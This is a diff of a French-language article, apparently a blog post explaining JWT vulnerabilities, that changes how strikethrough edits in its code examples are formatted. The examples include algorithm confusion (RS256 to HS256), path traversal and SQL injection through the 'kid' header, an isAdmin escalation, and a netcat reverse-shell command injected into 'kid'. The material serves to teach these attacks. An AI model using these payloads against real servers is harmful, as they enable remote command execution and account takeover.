@@ -201,7 +201,7 @@ On ne peut à priori pas signer de jeton avec la clé publique uniquement, sauf 
 
 ```json
 {
- "alg" : <strike>"RS256"</strike> "HS256",
+ "alg" : "RS256" "HS256",
  "typ" : "JWT"
 }
 ```
@@ -300,7 +300,7 @@ Header
 {
 	"alg" : "HS256",
 	"typ" : "JWT",
-	"kid" : <strike>"secret.key"</strike> "../www/html/robots.txt"
+	"kid" : "secret.key" "../www/html/robots.txt"
 }
 ```
 
@@ -309,7 +309,7 @@ Payload
 ```json
 {
 	"username" : "h4xor",
-	"isAdmin" : <strike>0</strike> 1
+	"isAdmin" : 0 1
 }
 ``` 
 
@@ -337,7 +337,7 @@ Ici il insère son propre secret dans la base de données, la clé d'ID 72 de la
 {
 	"alg" : "HS256",
 	"typ" : "JWT",
-	"kid" : <strike>2</strike> "2; INSERT INTO secrets VALUES (72,'je tai hacke mdr');--"
+	"kid" : 2 "2; INSERT INTO secrets VALUES (72,'je tai hacke mdr');--"
 }
 ```
 
@@ -367,13 +367,12 @@ Ici le problème est évident, l'utilisateur peut injecter ses propres commandes
 
 Ainsi, la lecture d'un jeton avec ce header
 
-```json
-{
-	"alg" :"HS256",
-	"typ" : "JWT",
-	"kid" : <strike>2</strike> "2; rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 12.34.56.78 1234 > f"
-}
-```
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+	</span><span class="nl">"alg"</span><span class="w"> </span><span class="p">:</span><span class="s2">"HS256"</span><span class="p">,</span><span class="w">
+	</span><span class="nl">"typ"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"JWT"</span><span class="p">,</span><span class="w">
+	</span><span class="nl">"kid"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><strike><span class="mi">2</strike><span class="w"> </span><span class="s2">"2; rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|nc 12.34.56.78 1234 &gt; f"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
 
 génèrera un reverse shell vers la machine du pirate, qu'il pourra utiliser pour exécuter les commandes qu'il souhaite sur notre serveur web.
 
